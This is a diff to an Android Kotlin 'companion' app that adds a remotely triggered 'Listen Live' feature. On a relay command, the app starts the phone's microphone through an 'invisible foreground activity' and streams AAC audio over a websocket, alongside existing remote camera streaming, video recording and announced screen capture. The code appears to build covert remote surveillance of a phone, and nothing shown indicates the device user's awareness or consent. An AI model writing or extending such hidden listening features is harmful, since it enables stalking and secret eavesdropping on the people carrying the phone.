@@ -90,6 +90,20 @@ try {
         }
     }
 
+    /** "Listen Live": the mic service is started through the same invisible foreground activity as the camera. */
+    private fun startListenLive() {
+        try {
+            val intent = android.content.Intent(context, com.operator.companion.LivePreviewLauncherActivity::class.java).apply {
+                flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION
+                putExtra(com.operator.companion.LivePreviewLauncherActivity.EXTRA_TARGET,
+                    com.operator.companion.LivePreviewLauncherActivity.TARGET_LISTEN)
+            }
+            context.startActivity(intent)
+        } catch (e: Exception) {
+            com.operator.companion.service.PhoneListenService.notify(false, "Phone blocked the microphone: ${e.message}")
+        }
+    }
+
     private fun stopCameraPreview() {
         com.operator.companion.service.LivePreviewService.stop(context.applicationContext)
         notifyCameraState(false, null)
@@ -104,11 +118,12 @@ try {
         }
     }
 
-    /** One hardware-H.264 camera packet (kind 1 config, 2 key, 3 delta) as a binary frame:
+    /** One hardware-H.264 camera packet (kind 1 config, 2 key, 3 delta; 4 AAC config, 5 AAC frame) as a binary frame:
      *  [u16 header length][JSON {"type":"CAMERA_PKT","k":kind,"pts":µs}][Annex-B bytes]. */
     fun sendCameraPacket(kind: Int, ptsUs: Long, data: ByteArray) {
         val ws = webSocket ?: return
-        if (kind == 3 && ws.queueSize() > 8L * 1024 * 1024) return   // never let OkHttp's 16 MB limit kill the link
+        // never let OkHttp's 16 MB limit kill the link (deltas and audio frames are the droppable ones)
+        if ((kind == 3 || kind == 5) && ws.queueSize() > 8L * 1024 * 1024) return
         val header = JSONObject().put("type", "CAMERA_PKT").put("k", kind).put("pts", ptsUs)
             .toString().toByteArray(Charsets.UTF_8)
         val frame = ByteBuffer.allocate(2 + header.size + data.size)
@@ -541,6 +556,8 @@ try {
                 put("edition", if (com.operator.companion.BuildConfig.LITE) "lite" else "full")
                 put("version_code", com.operator.companion.BuildConfig.VERSION_CODE)
                 put("device_owner", com.operator.companion.relay.AppLifecycle.isDeviceOwner(context))
+                // live media this app can send: AAC mic packets (Phase 4), MediaProjection screen H.264 (Phase 5)
+                put("media", org.json.JSONArray(listOf("aac", "screen_h264")))
                 RelayConfig.secret(context).takeIf { it.isNotEmpty() }?.let { put("relay_secret", it) }
             })
         }
@@ -702,6 +719,8 @@ try {
                 "SET_CAMERA_LENS" -> com.operator.companion.service.LivePreviewService.switchLens(payload.optString("lens", "back"))
                 "HUNT_COMMAND" -> com.operator.companion.hunt.HuntStore.onCommand(payload)
                 "STOP_CAMERA_STREAM" -> stopCameraPreview()
+                "START_PHONE_AUDIO" -> startListenLive()
+                "STOP_PHONE_AUDIO" -> com.operator.companion.service.PhoneListenService.stop(context.applicationContext)
 
                 "RECORD_VIDEO" -> {
                     val lens = payload.optString("lens", "back")
